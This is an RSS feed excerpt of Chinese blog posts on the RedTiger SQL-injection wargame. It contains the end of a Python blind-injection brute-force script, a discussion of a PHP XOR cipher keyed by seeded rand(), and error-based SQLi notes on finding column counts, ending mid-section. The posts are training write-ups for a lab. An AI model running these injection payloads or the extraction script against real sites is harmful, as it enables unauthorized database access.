&lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;2 or substring(keyword,&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">pos&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">,1)=&lt;/span>&lt;span class="se">\&amp;#39;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="se">\&amp;#39;&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>
&lt;span class="p">},&lt;/span> &lt;span class="n">cookies&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="c1"># **removed**&lt;/span>
&lt;span class="p">})&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="n">resp&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">find&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Query returned 1 rows.&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">pos&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nb">repr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1"> correct&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">secret&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">c&lt;/span>
&lt;span class="k">break&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;secret is &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">secret&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>注意 cookies，其他没有特别的地方。这个脚本略暴力，可以优化成 &lt;code>find_in_set&lt;/code> 二分搜索，可以显著降低请求次数。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>把 flag 贴进去就过了，没什么难的。原本想 sqlmap 能不能解决，但 sqlmap 还用不太熟练，不确定能不能盲注解出 keyword 的值。之后会在 DVWA 上研究下 sqlmap 猜解指定的字段要怎么猜。&lt;/p></description></item><item><title>一个有点离谱的trick</title><link>https://nnnewb.github.io/blog/p/a-trick-that-was-a-bit-off/</link><pubDate>Fri, 06 May 2022 11:06:52 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/a-trick-that-was-a-bit-off/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>打 red tiger 靶场的时候遇到一个有点怪的 trick ，慢慢道来。&lt;/p>
&lt;p>level 3 里会拿到一个 php 文件，里面有加密/解密算法。算法本身不算怪，就是个简单的 xor ，比较怪的是秘钥流的生成算法，还有涉及到的密码学内容。&lt;/p>
&lt;h2 id="正文">正文&lt;/h2>
&lt;h3 id="解密算法">解密算法&lt;/h3>
&lt;p>先看解密的算法。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="k">function&lt;/span> &lt;span class="nf">decrypt&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$str&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="nx">srand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">3284724&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">preg_match&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;%^[a-zA-Z0-9/+]*={0,2}$%&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$str&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="nv">$str&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">base64_decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$str&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$str&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$str&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="k">null&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$str&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="c1">// 前面都是参数验证，下面才是真正的解密
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$decStr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// 把字符串按3个字符一组分割
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 比如 123456789 分割成数组 123,456,789
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 密文每3位表示一个明文字符
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nv">$i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="nx">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$str&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="nv">$array&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">substr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$str&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 有趣的地方：伪随机数 xor 密文完成解密。
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">foreach&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$array&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="nv">$s&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="nv">$a&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$s&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="nx">rand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">255&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nv">$decStr&lt;/span> &lt;span class="o">.=&lt;/span> &lt;span class="nx">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$a&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nv">$decStr&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>我加了点注释。接着说说为什么有趣。&lt;/p>
&lt;h3 id="伪随机数">伪随机数&lt;/h3>
&lt;blockquote>
&lt;p>口胡警告。&lt;/p>
&lt;/blockquote>
&lt;p>首先显而易见，接触过随机数函数都应该知道什么叫 &lt;em>伪随机&lt;/em> ，基本伪随机数函数的文档都会给个密码学相关的警告，一般说的是这个函数不能生成在密码学而言安全的随机数。php 的 &lt;code>rand&lt;/code> 函数也有个这样的警告。&lt;/p>
&lt;blockquote>
&lt;p>This function does not generate cryptographically secure values, and should not be used for cryptographic purposes. If you need a cryptographically secure value, consider using &lt;a class="link" href="https://www.php.net/manual/en/function.random-int.php" target="_blank" rel="noopener"
>random_int()&lt;/a>, &lt;a class="link" href="https://www.php.net/manual/en/function.random-bytes.php" target="_blank" rel="noopener"
>random_bytes()&lt;/a>, or &lt;a class="link" href="https://www.php.net/manual/en/function.openssl-random-pseudo-bytes.php" target="_blank" rel="noopener"
>openssl_random_pseudo_bytes()&lt;/a> instead.&lt;/p>
&lt;/blockquote>
&lt;p>这就涉及所谓 &lt;em>伪随机&lt;/em> 的本质了。伪随机数之所以是 &lt;em>伪&lt;/em> 的，是因为其内部实现是一个让生成数字尽可能平均地分布到值域里的算法，如果给定输入则经过这个算法会得到固定的输出序列。对于不够强的伪随机数算法，得到一定数量的随机值后可以猜出随机种子或未来会出现的某个随机值的话，显然是不安全的。比如用作秘钥生成或者 &lt;code>nonce&lt;/code> 之类的场景。&lt;/p>
&lt;p>不过提到“不够强”，自然也有够强的伪随机数算法。也就是密码学安全的伪随机数生成器 &lt;em>cryptographically-secure pseudorandom number generator, CSPRNG or CPRNG&lt;/em>。参考 wiki 定义如下。&lt;/p>
&lt;blockquote>
&lt;p>除了满足统计学伪随机性外，还需满足“不能通过给定的随机序列的一部分而以显著大于 1/2 的概率在多项式时间内演算出比特序列的任何其他部分。”&lt;/p>
&lt;/blockquote>
&lt;p>真的不是很懂所以就不瞎扯了，继续说为啥有意思。&lt;code>rand&lt;/code> 函数产生的是一个 &lt;strong>随机序列&lt;/strong> ，然后这个序列被用来加密和解密，而且这个随机序列理论上来说是无限长的，而前述解密算法利用随机序列作为秘钥流解密密文。这就让人想到了另一个有意思的事情，&lt;em>一次一密&lt;/em>。&lt;/p>
&lt;h3 id="一次一密">一次一密&lt;/h3>
&lt;p>密码学入门教材应该有说过，一次一密是无条件安全的，统计学攻击对一次一密无效。但一次一密的难点在于如何传递或约定秘钥流，毕竟密文可以无条件安全，秘钥传递不行。如果是约定一个很长的秘钥流重复使用，那一次一密就退化成了MTP，获取到足够数量的密文还是可以被攻击。&lt;/p>
&lt;p>上面的解密算法有趣的地方就在于使用了 &lt;code>rand&lt;/code> 产生的随机数序列作为秘钥，如果再稍微改进一下，&lt;code>$_SESSION&lt;/code>里记录&lt;code>rand&lt;/code>的步数，完全可以实现伪一次一密，每次返回给浏览器的密文都不相同，凭密文也找不出规律。不过这样靶场难度就太高了=。=对我来说。&lt;/p>
&lt;p>对上面给出的解密算法只能算是 MTP，虽然秘钥长度是无限的，但加密总是在用前 N 个数当秘钥。如果已知明文再多一点的话即使不拿到这个加密/解密算法也可以简单拼凑下密文发起攻击（因为 xor 是简单的替代密码，没有置换）。&lt;/p>
&lt;h3 id="随机数平台版本差异">随机数平台/版本差异&lt;/h3>
&lt;p>回到题目本身，这个解密算法其实不是那么可移植。我验证了一下，在 Windows 下 php 5.4 &lt;code>rand&lt;/code> 产生的序列和 Linux 下 php 5.6 &lt;code>rand&lt;/code> 产生的序列是不同的。直接把上面的解密算法在 Windows 下跑无法正常解密。&lt;/p>
&lt;p>同时，php 5 的随机数算法和 php 7/8 的随机数算法又不一样，产生的序列不同。升级 php 版本也会导致原先加密的内容无法解密。&lt;/p>
&lt;p>最终用在线沙盒解决了问题。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>代码跑不起来注意下平台和版本差异，我觉得干过几年自己搭过项目环境都应该知道怎么回事吧&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>其他就是闲扯淡没什么好总结的，密码学的东西只看了点基础的，写不出证明也没怎么接触过什么正经实现。非要说的话就是比啥也不懂好一点。&lt;/p></description></item><item><title>redtiger靶场训练笔记</title><link>https://nnnewb.github.io/blog/p/redtiger-lab-training-notes/</link><pubDate>Fri, 06 May 2022 09:12:42 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/redtiger-lab-training-notes/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>靶场地址：http://redtiger.labs.overthewire.org/&lt;/p>
&lt;p>按照靶场约定，不会直接给任何解。仅记录在这个靶场练习的时候学到的东西。&lt;/p>
&lt;h2 id="error-based-sql-injection">error based SQL injection&lt;/h2>
&lt;p>red tiger 靶场都是盲注，但还是要提一嘴。学到多少算多少。error based SQL injection 顾名思义要靠错误，所以前端有错误消息回显才有用。但盲注的时候依然能用到一些相关技巧。&lt;/p>
&lt;h3 id="当前表列数量">当前表列数量&lt;/h3>
&lt;h4 id="group-by-法">group by 法&lt;/h4>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">group&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">by&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SQL&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">错误&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1054&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">42&lt;/span>&lt;span class="n">S22&lt;/span>&lt;span class="p">]:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">Unknown&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">column&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;5&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">in&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;group statement&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">是列号，不存在列的时候报上面的错，需要自己枚举&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">直到确认。因为一次测一个真&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="err">假所以盲注的时候也能用。&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h4 id="order-by-法">order by 法&lt;/h4>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">order&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">by&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">9&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">11&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">14&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">15&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SQL&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">错误&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1054&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">42&lt;/span>&lt;span class="n">S22&lt;/span>&lt;span class="p">]:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">Unknown&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">column&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;3&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">in&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;order clause&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">是列号，&lt;/span>&lt;span class="k">order&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">by&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">法一次可以枚举很多列，大多时候可以一次拿到当前表的列数。不过盲注的时候不行。可以用来缩小范围。&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h4 id="子查询法">子查询法&lt;/h4>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">where&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SQL&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">错误&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1241&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">21000&lt;/span>&lt;span class="p">]:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Operand&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">should&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">contain&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">column&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">这个方法直接爆出有几个列，但要求知道表名&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h4 id="union-法">union 法&lt;/h4>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">union&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">all&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">NULL&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">NULL&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">NULL&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">NULL&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">NULL&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">NULL&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">types&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">of&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">columns&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">must&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">match&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">or&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">be&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">of&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">derived&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">types&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">or&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">NULL&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SQL&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">错误&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1222&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">21000&lt;/span>&lt;span class="p">]:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">The&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">used&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">statements&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">have&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">different&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">number&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">of&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">columns&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">利用&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">union&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">查询列数量必须相等来确定左侧查询的列数量，如果左侧是&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">的话那&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">union&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">查询枚举的列数量就是表里列的数量&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="获取列名">获取列名&lt;/h3>
&lt;h4 id="unionnotnull">union+notnull&lt;/h4>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
